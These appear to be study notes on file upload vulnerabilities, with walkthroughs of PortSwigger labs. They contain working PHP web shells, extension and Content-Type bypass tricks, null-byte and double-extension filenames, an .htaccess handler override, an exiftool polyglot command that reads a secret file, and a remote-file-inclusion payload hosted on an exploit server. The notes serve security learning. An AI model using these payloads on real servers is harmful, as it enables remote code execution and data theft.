# File Upload Vulnerabiliyies
File upload vulnerabilities occur when a web server permits users to upload files without adequately validating aspects such as the file name, type, content, or size. If these restrictions are not properly enforced, even a simple image upload function can be exploited to upload arbitrary and potentially harmful files, including server-side script files that could enable remote code execution.
## Impact  
When assessing file upload vulnerabilities, two key aspects are considered:  
- Which aspects of the file, such as size, type, or content, the website fails to validate properly.  
- What restrictions, if any, are imposed on the file after it has been successfully uploaded.  
## Web shell
A web shell is a malicious script that allows an attacker to execute arbitrary commands on a remote web server by sending HTTP requests to a specific endpoint.  

If you successfully upload a web shell, you gain full control over the server. This allows you to read and write arbitrary files, exfiltrate sensitive data, and use the server to launch further attacks on internal infrastructure or external servers. For example, a simple PHP one-liner could be used to read arbitrary files from the server's filesystem.  
```
<?php echo file_get_contents('/path/to/target/file'); ?>
```
A more versatile web shell may look something like this: 
 ```
<?php echo system($_GET['command']); ?>
```
This script enables you to pass an arbitrary system command via a query parameter as follows: 
```
GET /example/exploit.php?command=id HTTP/1.1
```
### Labs Portswigger
1. **Web shell upload via Content-Type restriction bypass**
> Web shell upload via Content-Type restriction bypass
2. **Web shell upload via path traversal**
> Create web shell with directory traversal in filename (../) and URL encode it (%2e%2e%2f)
Now you can get your file with /files/avatars/../test.php
3. **Web shell upload via extension blacklist bypass**
> In case Appache, edit .htaccess file  
> e.g) AddType application/x-httpd-php .aaa(any file extensions)
4. **Web shell upload via obfuscated file extension**
> Null byte bypass rce.php%00.jpg

Other Obfuscating
```
exploit.php.jpg
exploit.php.
exploit%2Ephp
exploit.asp;.jpg or exploit.asp%00.jpg
exploit.p.phphp
```
5. **Remote code execution via polyglot web shell upload**
> Polyglot PHP/JPG file is an standard Image but with PHP code in metadata.
```
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" lel.jpg -o polyglot.php
```
6. Admin Panel RFI
> RFI function on target allow the upload of image from remote HTTPS URL source and perform to validation checks, the source URL must be HTTPS and the file extension is checked. Incorrect RFI result in response message, File must be either a jpg or png.  

To exploit this vulnerability, paste php payload in body section of your exploit server and name it shell.php:  
```
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
To bypass filters and provoke RFI, use the next payload:
```
https://exploit-server.com/shell.php#kek.jpg
```
